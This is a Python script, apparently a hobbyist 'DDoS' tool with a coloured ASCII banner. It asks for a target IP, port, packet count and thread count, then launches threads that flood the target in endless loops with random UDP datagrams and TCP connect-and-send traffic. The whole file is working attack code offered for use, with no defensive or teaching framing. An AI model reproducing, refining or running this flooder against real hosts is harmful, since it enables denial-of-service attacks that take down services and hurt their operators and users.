import random
import socket
import threading
import os,sys

os.system("clear")
print("""
\033[91m███████╗██╗░░██╗░█████╗░███╗░░░███╗
\033[0m██╔════╝╚██╗██╔╝██╔══██╗████╗░████║
\033[91m█████╗░░░╚███╔╝░███████║██╔████╔██║
\033[0m██╔══╝░░░██╔██╗░██╔══██║██║╚██╔╝██║
\033[91m███████╗██╔╝╚██╗██║░░██║██║░╚═╝░██║
\033[0m╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝
""")
ip = str(input(" \033[93m =====> IP TARGET\033[0m:"))
port = int(input(" \033[93m =====> PORT\033[0m:"))
choice = str(input(" \033[93m =====> (ddos/no)\033[0m:"))
times = int(input(" \033[93m =====> PAKET\033[0m:"))
threads = int(input(" \033[93m =====> THREADS\033[0m:"))
os.system("clear")
def ddos():
  data = random._urandom(1025)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m =====> Attack Ip Port \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Down!!!")

def ddos2():
  data = random._urandom(1024)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m =====> Attack Ip Port \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Down!!!")

def ddos3():
  data = random._urandom(16)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m =====> Attack Ip Port \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Down!!!")

for y in range(threads):
  if choice == 'ddos':
    th = threading.Thread(target = ddos)
    th.start()
    th = threading.Thread(target = ddos2)
    th.start()
    th = threading.Thread(target = ddos3)
    th.start()
